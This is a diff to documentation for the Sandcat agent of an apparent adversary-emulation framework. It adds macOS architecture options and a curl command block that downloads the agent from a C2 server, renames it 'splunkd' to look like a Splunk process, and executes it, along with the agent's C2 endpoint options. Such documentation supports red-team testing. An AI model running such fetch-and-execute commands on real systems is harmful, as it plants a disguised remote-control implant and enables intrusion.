@@ -43,6 +43,17 @@ the agent will re-compile itself dynamically to obtain a new file hash. This wil
 
 ### Options
 
+For MacOS, both amd64 and arm64 are supported. When retrieving the executable from the server, the architecture header
+can be used to select the correct executable: `-H "architecture:amd64"` or `-H "architecture:arm64"`.
+
+For example, requesting Sandcat on a MacOS amd64-based target:
+```
+server="http://0.0.0.0:8888";
+curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > splunkd;
+chmod +x splunkd;
+./splunkd -server $server -v
+```
+
 When running the Sandcat agent binary, there are optional parameters you can use when you start the executable:
 
 * `-server [C2 endpoint]`: This is the location (e.g. HTTP URL, IPv4:port string) that the agent will use to reach the C2 server. (e.g. `-server http://10.0.0.1:8888`, `-server 10.0.0.1:53`, `-server https://example.com`). The agent must have connectivity to this endpoint. 
